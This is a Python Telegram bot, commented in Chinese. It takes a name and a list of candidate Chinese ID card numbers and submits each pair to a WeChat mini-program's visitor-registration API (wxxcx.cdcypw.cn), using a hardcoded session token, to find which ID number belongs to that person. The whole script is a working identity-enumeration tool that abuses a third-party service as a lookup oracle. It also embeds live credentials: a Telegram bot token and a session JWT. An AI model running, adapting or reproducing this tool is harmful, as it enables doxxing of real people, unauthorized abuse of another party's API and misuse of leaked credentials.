import telebot
import requests
import time
import re
import threading
from concurrent.futures import ThreadPoolExecutor

# ================= 配置区 =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
CURRENT_X_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJsaXVjYWkiLCJzdWIiOiJ3ZWNoYXQ6bzhiQ2w2MmtyUUVwRzZHTmlaaF9YczhrcHBXVSIsImF1ZCI6WyJjZGN5cHciXSwiZXhwIjoxNzcwMDYwNTkzLCJuYmYiOjE3NzAwNDk3OTMsImlhdCI6MTc3MDA0OTc5MywianRpIjoiZjZjZDUxOTQtMDIyZS00YWIxLWI1NzUtNmQyYTc0YWI1MTUwIiwidXNlcl90eXBlIjoid2VjaGF0LXZpcCIsInVzZXJfaWQiOjMwMDQ1OH0.E8QrvHjur1JZPh2K43_ppaMq6NxQWj2EcSTP3AfRnsQAlIvOJwHAOXmCrDOQMFIbsO6dPyAmTV3CznKPrUkIZQ"

# 初始化机器人
bot = telebot.TeleBot(API_TOKEN)
user_states = {}

# --- 身份证校验逻辑 ---
def is_valid_id(n):
    n = str(n).upper()
    if len(n) != 18: return False
    try:
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 核心核验任务 ---
def run_batch_task(chat_id, msg_id, name, id_list):
    global CURRENT_X_TOKEN
    headers = {
        "X-Token": CURRENT_X_TOKEN,
        "content-type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68"
    }
    
    try:
        test_r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", 
                              json={"name": "测试", "id_no": "110101199001011234"}, headers=headers, timeout=5)
        res_json = test_r.json()
        if res_json.get("code") == 401 or "失效" in res_json.get("msg", ""):
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="⚠️ **任务终止:检测到当前 Token 已失效!**\n请使用 `/set_token` 更新后再试。")
            return
    except Exception as e:
        print(f"请求接口失败: {e}")

    total = len(id_list)
    success_results = []
    done = 0
    is_running = True
    token_expired = False

    def progress_monitor():
        nonlocal done, is_running
        last_sent_done = -1
        while is_running:
            if done != last_sent_done:
                progress_idx = int((done / total) * 10)
                bar = "█" * progress_idx + "▒" + "░" * (9 - progress_idx)
                percent = int(done / total * 100)
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=msg_id,
                        text=(f"🔍 **正在核验...**\n📊 `{bar}` **{percent}%**\n🔢 `{done}` / `{total}`"),
                        parse_mode='Markdown'
                    )
                    last_sent_done = done
                except: pass
            time.sleep(3)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, token_expired
        if not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=10)
            res_data = r.json()
            if res_data.get("code") == 401:
                token_expired = True
                is_running = False
                return
            if res_data.get("code") == 0:
                success_results.append(f"`{name} {id_no}` ✅")
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(verify, id_list)

    is_running = False 
    if token_expired:
        bot.send_message(ADMIN_ID, "🚨 Token 已过期！")
        return

    if success_results:
        bot.send_message(chat_id, "\n".join(success_results), parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "❌ 未发现匹配。")

# --- 指令处理 ---
@bot.message_handler(commands=['set_token'])
def set_token_command(message):
    if message.from_user.id != ADMIN_ID: return
    msg = bot.send_message(message.chat.id, "🗝 请发送新的 X-Token:")
    bot.register_next_step_handler(msg, update_token)

def update_token(m):
    global CURRENT_X_TOKEN
    CURRENT_X_TOKEN = m.text.strip()
    bot.send_message(m.chat.id, "✅ Token 已更新")

@bot.message_handler(commands=['start'])
def start_batch(message):
    bot.send_message(message.chat.id, "请输入姓名:")
    user_states[message.chat.id] = {'step': 'get_name'}

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'get_name')
def get_name(message):
    user_states[message.chat.id] = {'step': 'get_ids', 'name': message.text.strip()}
    bot.send_message(message.chat.id, f"请发送身份证号列表:")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'get_ids')
def get_ids(message):
    data = user_states[message.chat.id]
    raw_ids = re.findall(r'\d{17}[\dXx]', message.text)
    valid_ids = [i for i in raw_ids if is_valid_id(i)]
    if not valid_ids:
        bot.reply_to(message, "❌ 未识别到有效号码。")
        return
    status_msg = bot.send_message(message.chat.id, "⚙ 正在初始化...")
    threading.Thread(target=run_batch_task, args=(message.chat.id, status_msg.message_id, data['name'], valid_ids)).start()
    del user_states[message.chat.id]

# ================= 运行区 =================
if __name__ == '__main__':
    print("--- 机器人启动中... ---")
    while True:
        try:
            print("连接 Telegram 服务器...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"连接出错: {e}, 10秒后尝试重连...")
            time.sleep(10)
